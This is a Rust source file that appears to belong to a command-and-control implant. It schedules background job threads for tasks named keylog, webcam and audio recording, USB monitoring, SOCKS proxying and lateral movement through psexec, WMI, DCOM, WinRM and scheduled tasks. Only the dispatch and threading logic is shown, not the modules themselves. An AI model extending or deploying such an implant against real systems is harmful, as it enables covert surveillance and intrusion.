//! Job execution runtime for background tasks

use common::{Job, JobId, JobManager, JobOutput, JobStatus, TaskId};
use protocol::Task;
use std::sync::Arc;
use std::thread;

use crate::error::{ImplantError, ImplantResult};
use crate::registry;

/// Task classifier - determines if a task should run in background
pub fn should_background(task_type: &str) -> bool {
    match task_type {
        // Background: long-running operations
        "portscan" | "download" | "upload" | "screenshot_stream" | "keylog" | "socks_proxy"
        | "lateral_psexec" | "lateral_wmi" | "lateral_dcom" | "lateral_winrm"
        | "lateral_schtask" | "bof_execute" | "webcam_stream" | "audio_record"
        | "usb_monitor" => true,

        // Foreground: quick operations
        "shell" | "pwd" | "whoami" | "ps" | "ls" | "cat" | "token_list" | "sleep" | "exit"
        | "module" | "file_list" | "file_read" | "proc_list" | "env_get" => false,

        // Default: foreground for safety (avoid blocking unknown tasks)
        _ => false,
    }
}

/// Execute a task in a background job thread
pub fn spawn_job_thread(
    job_manager: Arc<JobManager>,
    job_id: JobId,
    task: Task,
) -> ImplantResult<()> {
    let job = job_manager
        .get_job(job_id)
        .ok_or_else(|| ImplantError::Task(format!("job {} not found", job_id)))?;

    // Spawn thread for job execution
    thread::spawn(move || {
        // Execute the task
        let task_type = task.task_type.as_str();
        let task_data = task.task_data.clone();

        // Check for cancellation before starting
        if job.should_cancel() {
            job.set_status(JobStatus::Cancelled);
            return;
        }

        let result = execute_module_task_internal(task_type, &task_data, job.clone());

        match result {
            Ok(output) => {
                job.append_output(&output);
                job.complete();

                // Queue final output
                job_manager.queue_output(JobOutput {
                    job_id,
                    task_id: job.task_id,
                    output,
                    is_final: true,
                    final_status: Some(JobStatus::Completed),
                });
            }
            Err(e) => {
                job.set_error(e.to_string());

                // Queue error output
                job_manager.queue_output(JobOutput {
                    job_id,
                    task_id: job.task_id,
                    output: format!("Job failed: {}", e).into_bytes(),
                    is_final: true,
                    final_status: Some(JobStatus::Failed),
                });
            }
        }
    });

    Ok(())
}

/// Execute a module task (internal, for job threads)
fn execute_module_task_internal(
    task_type: &str,
    task_data: &[u8],
    _job: Arc<Job>,
) -> ImplantResult<Vec<u8>> {
    let reg = registry::registry();

    let module = reg
        .get(task_type)
        .ok_or_else(|| ImplantError::Task(format!("unknown task type: {}", task_type)))?;

    // Execute with periodic cancellation checks
    // For now, just execute directly - individual modules should check job.should_cancel()
    let task_id = TaskId::new();
    let result = module
        .handle(task_id, task_data)
        .map_err(|e| ImplantError::Task(e.to_string()))?;

    // Serialize result
    let result_bytes = serde_json::to_vec(&result)
        .map_err(|e| ImplantError::Task(format!("failed to serialize result: {}", e)))?;

    Ok(result_bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_should_background() {
        // Background tasks
        assert!(should_background("portscan"));
        assert!(should_background("download"));
        assert!(should_background("upload"));
        assert!(should_background("lateral_psexec"));

        // Foreground tasks
        assert!(!should_background("shell"));
        assert!(!should_background("pwd"));
        assert!(!should_background("ps"));
        assert!(!should_background("sleep"));

        // Unknown defaults to foreground
        assert!(!should_background("unknown_task"));
    }
}
